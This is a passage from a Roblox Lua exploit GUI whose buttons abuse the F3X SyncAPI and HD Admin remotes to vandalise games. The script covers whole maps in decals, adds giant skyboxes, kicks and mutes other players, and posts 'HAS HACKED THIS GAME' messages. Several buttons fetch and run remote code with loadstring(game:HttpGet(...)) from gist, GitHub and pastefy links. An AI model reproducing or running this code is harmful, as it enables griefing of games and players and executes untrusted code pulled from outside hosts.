end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

-- ✅ Call spam function with decal ID

spam("16442228290")
    end
})
AddButton({
    Name = "Brick Spawn",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

-- Get F3X tool
local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
    remote:InvokeServer(unpack(args))
end

-- Create part
function CreatePart(cf, parent)
    _( {"CreatePart", "Normal", cf, parent} )
end

-- Anchor toggle
function SetAnchor(part, state)
    _( {"SyncAnchor", { {["Part"] = part, ["Anchored"] = state} }} )
end

-- Spawn 5 unanchored bricks instantly
for i = 1, 5 do
    local brickCF = hrp.CFrame * CFrame.new(5 + (i - 1) * 5, 0, 0) -- offset each brick 5 studs apart
    CreatePart(brickCF, workspace)
    task.wait() -- tiny wait to let part register

    -- Find it and unanchor
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - brickCF.Position).Magnitude < 0.1 then
            SetAnchor(v, false)
        end
    end
end
    end
})
AddButton({
    Name = "Trump Skybox",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

    if v.Name == "SyncAPI" then

        tool = v.Parent

    end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

    remote:InvokeServer(unpack(args))

end

function CreatePart(cf, parent)

    _( {"CreatePart", "Normal", cf, parent} )

end

function SetAnchor(part, state)

    _( {"SyncAnchor", { {["Part"] = part, ["Anchored"] = state} }} )

end

function AddMesh(part)

    _( {"CreateMeshes", { {["Part"] = part} }} )

end

function SetMesh(part, meshid)

    _( {"SyncMesh", { {["Part"] = part, ["MeshId"] = "rbxassetid://" .. meshid} }} )

end

function SetTexture(part, texid)

    _( {"SyncMesh", { {["Part"] = part, ["TextureId"] = "rbxassetid://" .. texid} }} )

end

function MeshResize(part, size)

    _( {"SyncMesh", { {["Part"] = part, ["Scale"] = size} }} )

end

function Sky(id)

    local hrp = char:WaitForChild("HumanoidRootPart")

    local cf = hrp.CFrame

    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    for _, v in workspace:GetDescendants() do

        if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then

            SetAnchor(v, true)

            AddMesh(v)

            SetMesh(v, "111891702759441")

            SetTexture(v, id)

            MeshResize(v, Vector3.new(8000, 8000, 8000))

        end

    end

end

Sky("14771520251")
    end
})
AddButton({
    Name = "Trump Decal",
    Callback = function()
   local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

-- ✅ Call spam function with decal ID

spam("14771520251")
end   
})
AddButton({
    Name = "Skeleton Sky",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
(==================================)
( --★ Epik Skeleton Skybox F3X By ItsKittyyyGD ★--)
(|==================================)
(--★ SCRIPT CHANGELOGS: ★--)                                   )
(-) Deleted create sky and destroy Now use Set texture. )
(★) Smooth Skybox Video.                                             )
(==================================)
( I love you Blue2Spooky,Thanks for using my things.)
(==================================)
]]
-- SOURCE
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";fogcolor black")
SilentRequest:InvokeServer(";time 0")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint
local RunService = game:GetService("RunService")

function _(args)
    remote:InvokeServer(unpack(args))
end

function CreatePart(cf, parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end

function SetAnchor(part, boolean)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetTransparency(part, value)
    local args = {
        [1] = "SyncTransparency",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = value
            }
        }
    }
    _(args)
end

function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    _(args)
end

local images = {
    "http://www.roblox.com/asset/?id=169585459",
    "http://www.roblox.com/asset/?id=169585475",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585515",
    "http://www.roblox.com/asset/?id=169585502",
    "http://www.roblox.com/asset/?id=169585485",
    "http://www.roblox.com/asset/?id=169585475"
}

local skyPart
local skyLoop
local frameTime = 1 / 10
local lastUpdate = 0

function CreateSky()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    local found = false
    for i = 1, 50 do
        task.wait()
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
                skyPart = v
                found = true
                break
            end
        end
        if found then break end
    end

    if not skyPart then return end

    SetAnchor(skyPart, true)
    AddMesh(skyPart)
    SetMesh(skyPart, "111891702759441")
    MeshResize(skyPart, Vector3.new(99999, 99999, 99999))
    SetTransparency(skyPart, 0)

    local index = 1
    skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
        lastUpdate = lastUpdate + deltaTime
        if lastUpdate >= frameTime then
            lastUpdate = 0
            if not skyPart then
                skyLoop:Disconnect()
                return
            end
            SetTexture(skyPart, images[index])
            index = (index % #images) + 1
        end
    end)
end

function ResetSky()
    if skyLoop then
        skyLoop:Disconnect()
        skyLoop = nil
    end
    if skyPart then
        DestroyPart(skyPart)
        skyPart = nil
    end
    task.spawn(CreateSky)
end

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    ResetSky()
end)

if char and char:FindFirstChild("Humanoid") then
    char:WaitForChild("Humanoid").Died:Connect(function()
        ResetSky()
    end)
end

CreateSky()
    end
})
AddButton({
    Name = "Refresh",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";re")
    end
})
AddButton({
    Name = "Disco Fog",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";disco")
SilentRequest:InvokeServer(";fog 11000")
    end
})
AddButton({
    Name = "Undisco Fog",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";undisco")
    end
})
AddButton({
    Name = "Day",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";time 12")
    end
})
AddButton({
    Name = "Night",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";time 25")
    end
})
AddButton({
    Name = "Billboard",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";titley me ANGira249")
    end
})
AddButton({
    Name = "Kill Aura",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";titley ANGira249")
    end
})
AddButton({
    Name = "Baseplate",
    Callback = function()
        local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
    _( { "SyncCollision", { { Part = part, CanCollide = boolean } } } )
end

function SetAnchor(boolean, part)
    _( { "SyncAnchor", { { Part = part, Anchored = boolean } } } )
end

function CreatePart(cf, parent, types)
    _( { "CreatePart", types, cf, parent } )
end

function DestroyPart(part)
    _( { "Remove", { part } } )
end

function MovePart(part, cf)
    _( { "SyncMove", { { Part = part, CFrame = cf } } } )
end

function Resize(part, size, cf)
    _( { "SyncResize", { { Part = part, CFrame = cf, Size = size } } } )
end

function AddMesh(part)
    _( { "CreateMeshes", { { Part = part } } } )
end

function SetMesh(part, meshid)
    _( { "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid } } } )
end

function SetTexture(part, texid)
    _( { "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } } )
end

function SetName(part, name)
    _( { "SetName", { part }, name } )
end

function MeshResize(part, size)
    _( { "SyncMesh", { { Part = part, Scale = size } } } )
end

function Weld(part1, part2, lead)
    _( { "CreateWelds", { part1, part2 }, lead } )
end

function SetLocked(part, boolean)
    _( { "SetLocked", { part }, boolean } )
end

function SetTrans(part, transparency)
    _( { "SyncMaterial", { { Part = part, Transparency = transparency } } } )
end

function CreateSpotlight(part)
    _( { "CreateLights", { { Part = part, LightType = "SpotLight" } } } )
end

function SyncLighting(part, brightness)
    _( { "SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = brightness } } } )
end

function Material(part, material)
    _( { "SyncMaterial", { { Part = part, Material = material } } } )
end

function Color(part, color)
    _( { "SyncColor", { { Part = part, Color = color, UnionColoring = false } } } )
end

-- HumanoidRootPart position
local hrp = char:WaitForChild("HumanoidRootPart")
local hrpx = math.floor(hrp.Position.X)
local hrpy = math.floor(hrp.Position.Y)
local hrpz = math.floor(hrp.Position.Z)

-- NEW grass baseplate function
function SpawnGrassPlate()
    -- Spawn part under player
    CreatePart(CFrame.new(hrpx, hrpy - 10, hrpz), workspace, "Spawn")
    task.wait(1)

    for _, v in workspace:GetChildren() do
        if v:IsA("BasePart")
        and math.floor(v.Position.Y) == hrpy - 10
        and math.floor(v.Position.X) == hrpx then
            spawn(function()
                -- Make it large grass plate
                Resize(v, Vector3.new(1000, 1, 1000), CFrame.new(hrpx, hrpy - 10, hrpz))
                Color(v, Color3.fromRGB(106, 127, 63)) -- grass-like green
                Material(v, Enum.Material.Grass) -- natural grass

                -- Keep locked
                while task.wait(1) do
                    pcall(function() SetLocked(v, true) end)
                end
            end)
        end
    end
end

-- Execute
SpawnGrassPlate()
    end
})
AddButton({
    Name = "F3X Panel",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- join https://discord.gg/bESPJj7h7U
loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
    end
})
AddButton({
    Name = "Blue2spooky V5",
    Callback = function()        
        loadstring(game:HttpGet("https://pastefy.app/kb8eBe96/raw"))()
    end
})
AddButton({
    Name = "k00pgui remake",
    Callback = function()        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Aueuwd/K00pgui/refs/heads/main/k00pguibtooIsandfuck.txt"))()
    end
})
AddButton({
    Name = "c00lgui",
    Callback = function()        
        loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/01812a5a4fe103d45556670067ef85e1/raw/c157a2f739b2de7c8336e890e40d96e3a6d548fd/c00lguiByBlue2Spooky"))()
    end
})
AddButton({
    Name = "k00pgui v6",
    Callback = function()        
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

local K0OL = Instance.new("ScreenGui")
K0OL.ResetOnSpawn = false -- ✅ Keeps GUI after respawn
K0OL.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

local k00p = Instance.new("Frame")
k00p.Size = UDim2.new(0, 607, 0, 405)
k00p.Position = UDim2.new(0.5, -303, 0.5, -392)
k00p.BackgroundColor3 = Color3.new(0, 0, 0)
k00p.BorderColor3 = Color3.fromRGB(0, 53, 11)
k00p.BorderSizePixel = 5
k00p.Parent = K0OL
k00p.Active = true
k00p.Draggable = true

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(0, 590, 0, 305) 
scroll.Position = UDim2.new(0, 10, 0, 70) 
scroll.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
scroll.ScrollBarThickness = 8
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.ClipsDescendants = true
scroll.Parent = k00p

local title = Instance.new("TextLabel")
title.Text = "k00pgui v6"
title.TextSize = 24
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0.0124216368, 0, -0.00999999978, 0)
title.Parent = k00p
title.TextScaled = true

local title2 = Instance.new("TextLabel")
title2.Text = "by @k00pkiddAlt    [team k00pkidd]"
title2.TextSize = 18
title2.TextColor3 = Color3.new(1, 1, 1)
title2.BackgroundTransparency = 1
title2.Size = UDim2.new(1, 0, 0, 60)
title2.Position = UDim2.new(0, 0, 0.08, 0)
title2.Parent = k00p

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 160, 0, 77)
layout.CellPadding = UDim2.new(0, 10, 0, 10)
layout.FillDirection = Enum.FillDirection.Horizontal
layout.FillDirectionMaxCells = 3
layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
layout.VerticalAlignment = Enum.VerticalAlignment.Top
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scroll

function BT(text, func)
	local button = Instance.new("TextButton")
	button.BackgroundColor3 = Color3.new(0, 0, 0)
	button.BorderColor3 = Color3.fromRGB(0, 53, 11)
	button.BorderSizePixel = 1
	button.TextColor3 = Color3.new(1, 1, 1)
	button.TextSize = 14
	button.TextScaled = true
	button.Text = text
	button.Size = UDim2.new(0, 300, 0, 200)
	button.Parent = scroll
	button.MouseButton1Click:Connect(func)
end

BT("Decal", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/6b1be5ddb50270c311da2ab694398c44/raw/a149a326f33ebfd1ef5d5d9a6a572cefa04b8158/Decal"))()
end)

BT("SkyBox", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/fde49c807c9b62bd0290fa47caf8c478/raw/2ae0f9417614d5390d3a0fb4de89db57d15fbf18/gistfile1.txt"))() 
end)

BT("Hint", function()
	RequestCommandSilent:InvokeServer(";sh TEAM K00PKIDD HAS HACKED THIS GAME.")
end)

BT("Particles", function()
	loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/5a37089a30153528fcf7d58b8552068a/raw/92b539e0114a613535ffa26ca910419d745e9d0b/Particles"))()
end)

BT("play theme", function()
	RequestCommandSilent:InvokeServer(";music 1839246711 ;volume inf")
end)

BT("666", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/160f28b726f975bed311756d180fa2d0/raw/b0196979ac731ac61b074a92d9e17a405d1bde5a/666"))()
end)

BT("UnAnchor", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/ecd3df69b3fae922f35d04337be41d09/raw/0b2e8fc180b155d6cb709d1f17abe58ce5ded66b/Cracked"))()
end)

BT("Shutdown", function()
	local plr = game:GetService("Players").LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommandSilent:InvokeServer(";kick all Teh Game Iz Duked Up!1!")
	wait(1)
	plr:Kick("Teh Game Iz Duked Up!1!")
end)

BT("disco", function()
	RequestCommandSilent:InvokeServer(";disco")
end)

BT("Gravity Hammer", function()
	RequestCommandSilent:InvokeServer(";gear me 48088344")
end)

BT("Destroy. [ONLY FOR EMERGENCY]", function()
	loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/3f913cb07342f5f5a81aa3ec570de764/raw/a191ecec982d894601ee70640d7604a8cefe4505/Realm"))()
end)

BT("Message", function()
	RequestCommandSilent:InvokeServer(";sm EL K0PARAZ HAXXORED THIS GAME1!1!1")
end)
    end
})
    
AddButton({
    Name = "Teams",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";createteam red ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam blue ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam db ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam green ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam dg ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam pk ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam p ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam y ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam o ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam black ANGira249 Was Here")
	SilentRequest:InvokeServer(";createteam white ANGira249 Was Here")
    end
})
AddButton({
    Name = "Anti Admin Fuckers",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfly others")
SilentRequest:InvokeServer(";uncmdbar2 others")
SilentRequest:InvokeServer(";hideguis others")
SilentRequest:InvokeServer(";mute others")
    end
})
AddButton({
    Name = "Shedletsky",
    Callback = function()
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
--// SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Try to find SyncAPI in player first
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
-- If not found, check ReplicatedStorage
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

--// Simple remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

--// Helper functions
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end
local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end
local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end
local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end
local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end
local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end
local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end
local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end
local function Resize(part, size, cf)
    _({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end
local function SpawnDecal(part, face)
    _({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function AddDecal(part, asset, face)
    _({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end
local function SetName(part, name)
    _({"SetName", {part}, name})
end
local function SetTrans(part, val)
    _({"SyncMaterial", {{Part = part, Transparency = val}}})
end
local function delete(part)
    _({"Remove", {part}})
end

--// === Giant Sky Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local pos = hrp.Position + Vector3.new(0, 6, 0)

    CreatePart(CFrame.new(pos), workspace)  
    task.wait(0.3)  

    for _, v in workspace:GetDescendants() do  
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then  
            SetAnchor(v, true)  
            AddMesh(v)  
            SetMesh(v, "111891702759441") -- sphere mesh  
            SetTexture(v, id)  
            MeshResize(v, Vector3.new(90000, 90000, 90000))  
            SetCollision(v, false)  
            SetLocked(v, true)  
        end  
    end
end

--// === Improved Particle Effect System ===
local activeParticles = {}
local particleCooldowns = {}

local function createParticleForPlayer(targetPlayer, textureId)
    -- Wait for character to load
    local character = targetPlayer.Character
    if not character then
        targetPlayer.CharacterAdded:Wait()
        character = targetPlayer.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    
    -- Initialize cooldown for this player/texture combination
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    while true do
        local currentTime = tick()
        
        -- Check cooldown (2 seconds between particles)
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            -- Check if player and character are still valid
            if not targetPlayer or not targetPlayer.Parent or not character or not character.Parent or humanoid.Health <= 0 then
                break
            end
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(1)
                continue
            end

            -- Spawn particle above head
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            task.spawn(function()  
                CreatePart(spawnCFrame, workspace)  
                task.wait(0.1)  
                
                local newPart = nil
                for _, v in workspace:GetChildren() do  
                    if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                        newPart = v
                        break
                    end  
                end
                
                if newPart then
                    SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                    Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                    SetCollision(newPart, false)  
                    SetTrans(newPart, 1)  
                    SetAnchor(newPart, true)  
                    newPart.Orientation = Vector3.new(0, 0, 0)  

                    SpawnDecal(newPart, Enum.NormalId.Front)  
                    AddDecal(newPart, textureId, Enum.NormalId.Front)  
                    SpawnDecal(newPart, Enum.NormalId.Back)  
                    AddDecal(newPart, textureId, Enum.NormalId.Back)  

                    -- Track this particle
                    local particleId = #activeParticles + 1
                    activeParticles[particleId] = newPart

                    -- Animate particle rising up
                    for i = 1, 40 do  -- Reduced frames for faster cleanup
                        if newPart and newPart.Parent and head and head.Parent then  
                            local currentHeadPos = head.Position
                            local newPosition = Vector3.new(
                                currentHeadPos.X,
                                spawnCFrame.Position.Y + (i * 2),  -- Move up 2 studs per frame
                                currentHeadPos.Z
                            )
                            local newCFrame = CFrame.new(newPosition)
                            Resize(newPart, newPart.Size, newCFrame)  
                            task.wait(0.05)  -- Slightly faster animation
                        else
                            break
                        end
                    end  
                    
                    -- Cleanup
                    if newPart and newPart.Parent then
                        delete(newPart)  
                    end
                    activeParticles[particleId] = nil
                end  
            end)  
        end
        
        task.wait(0.5) -- Check every 0.5 seconds instead of 0.1
    end
end

--// === Manage Particles for All Players ===
local function startParticleSystem()
    local textureIds = {"85312612489831"}
    local activeConnections = {}
    
    -- Function to start particles for a specific player
    local function startForPlayer(player)
        for _, texId in ipairs(textureIds) do
            coroutine.wrap(function()
                createParticleForPlayer(player, texId)
            end)()
        end
    end
    
    -- Function to stop particles for a specific player
    local function stopForPlayer(player)
        -- Clean up any particles for this player
        for particleId, part in pairs(activeParticles) do
            if part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Start particles for all current players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        startForPlayer(newPlayer)
    end)
